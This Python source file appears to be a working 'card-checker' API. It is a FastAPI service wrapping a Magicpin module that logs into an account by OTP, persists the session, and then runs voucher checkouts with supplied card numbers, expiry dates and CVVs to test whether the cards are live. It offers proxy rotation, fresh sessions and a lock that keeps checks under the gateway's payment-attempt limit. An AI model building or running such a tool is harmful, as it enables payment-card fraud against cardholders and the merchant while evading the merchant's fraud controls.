"""
api.py — Magicpin card-checker API (FastAPI wrapper around mpin.py).

One-time login: /mp/login/send + /mp/login/verify persist the auth session to
session.json (auth_token + user_id + cookies).  Every subsequent /mp/check
reuses that session until the token expires — no OTP needed per check.

Endpoints:
  GET  /mp/brands          -> voucher catalog
  GET  /mp/status          -> session status (authed / phone)
  POST /mp/login/send      -> {phone}        send OTP
  POST /mp/login/verify    -> {phone, otp}   verify + persist session
  GET  /mp/check           -> {cc, brand, amount, qty, proxy, fresh}  run a check
"""
from __future__ import annotations

import asyncio
import json
import os
import sys
import threading
import time

_here = os.path.dirname(os.path.abspath(__file__))
if _here not in sys.path:
    sys.path.insert(0, _here)

from fastapi import FastAPI, Request, Query
from fastapi.responses import JSONResponse

import mpin
from mpin import Magicpin, VOUCHERS_CATALOG, pick_brand

app = FastAPI(title="Magicpin Checker API", docs_url=None, redoc_url=None)

# Serialize checks — one Magicpin account = one gateway session.  Concurrent
# checkouts on the same account trip the "payment attempt limit" immediately.
_check_lock = threading.Lock()


def _run_check(card: str, brand_key: str | None, amount: str | None,
               qty: str, proxy: str | None, fresh: bool,
               wait_unlock: bool = False, unlock_mins: int = 360) -> dict:
    """Run a single card check via mpin._flow, capturing all emit() outputs."""
    results: list[dict] = []
    orig_emit = mpin.emit

    def _collect(r):
        results.append(r)
        return r

    mpin.emit = _collect
    try:
        pos = [brand_key] if brand_key else []
        opts = {"card": card, "quiet": True, "qty": int(qty or "1")}
        if amount:
            opts["amt"] = amount
        if proxy:
            opts["proxy"] = proxy
        if fresh:
            opts["fresh"] = True
        if wait_unlock:
            opts["wait_unlock"] = True
        opts["unlock_mins"] = int(unlock_mins or 360)
        code = mpin._flow(opts, pos, True)
        last = results[-1] if results else {}
        return {
            "ok": code == 0,
            "exit": code,
            "result": last,
            "history": results,
        }
    except Exception as e:
        return {"ok": False, "exit": 1, "result": {"Gateway": "Magic Pin", "Response": f"error: {e}"}}
    finally:
        mpin.emit = orig_emit


@app.get("/mp/brands")
async def route_brands():
    catalog = []
    for k, v in VOUCHERS_CATALOG.items():
        catalog.append({"key": k, "name": v["name"], "merchant_id": v["merchant_id"],
                        "category": v["category"], "url": v["url"]})
    return JSONResponse({"ok": True, "brands": catalog})


@app.get("/mp/variants")
async def route_variants(brand: str = Query("1")):
    """Return the REAL voucher variants (amount + roa_id + in_stock) for a brand,
    scraped live from the brand page so the bot can show the actual amounts."""
    if brand not in VOUCHERS_CATALOG:
        return JSONResponse({"ok": False, "error": "unknown brand"}, status_code=400)
    item = VOUCHERS_CATALOG[brand]
    engine = Magicpin(quiet=True)
    try:
        catalog = await asyncio.to_thread(
            engine.fetch_variants, item["url"], item["merchant_id"])
        return JSONResponse({
            "ok": True,
            "merchant": catalog.get("merchant_name", ""),
            "variants": catalog.get("vouchers", []),
        })
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)[:160]})


@app.get("/mp/status")
async def route_status():
    engine = Magicpin(quiet=True)
    return JSONResponse({
        "ok": True,
        "authed": engine.authed(),
        "phone": engine.phone,
        "user_id": engine.user_id,
    })


@app.post("/mp/login/send")
async def route_login_send(request: Request):
    body = await request.json()
    phone = str(body.get("phone", "")).strip()
    if not phone:
        return JSONResponse({"ok": False, "error": "phone required"}, status_code=400)
    engine = Magicpin(quiet=True)
    r = await asyncio.to_thread(engine.send_otp, phone)
    return JSONResponse({"ok": True, "response": r})


@app.post("/mp/login/verify")
async def route_login_verify(request: Request):
    body = await request.json()
    phone = str(body.get("phone", "")).strip()
    otp = str(body.get("otp", "")).strip()
    if not phone or not otp:
        return JSONResponse({"ok": False, "error": "phone + otp required"}, status_code=400)
    engine = Magicpin(quiet=True)
    data = await asyncio.to_thread(engine.verify_otp, phone, otp)
    return JSONResponse({"ok": engine.authed(), "authed": engine.authed(), "response": data})


@app.get("/mp/check")
async def route_check(
    cc: str = Query(...),
    brand: str | None = Query(None),
    amount: str | None = Query(None),
    qty: str | None = Query("1"),
    proxy: str | None = Query(None),
    fresh: bool = Query(False),
    wait_unlock: bool = Query(False),
    unlock_mins: int = Query(360),
):
    if not cc or "|" not in cc:
        return JSONResponse({"ok": False, "error": "cc must be number|mm|yy|cvv"}, status_code=400)

    # quick auth gate so we don't burn a gateway session on a dead login
    probe = Magicpin(quiet=True)
    if not probe.authed():
        return JSONResponse({"ok": False, "error": "LOGIN_REQUIRED", "hint": "POST /mp/login/send then /mp/login/verify"}, status_code=401)

    def _blocking():
        with _check_lock:
            return _run_check(cc, brand, amount, qty, proxy, fresh, wait_unlock, unlock_mins)

    result = await asyncio.to_thread(_blocking)
    return JSONResponse(result)


if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("MP_PORT", "9100"))
    uvicorn.run("api:app", host="0.0.0.0", port=port, workers=1, access_log=False)
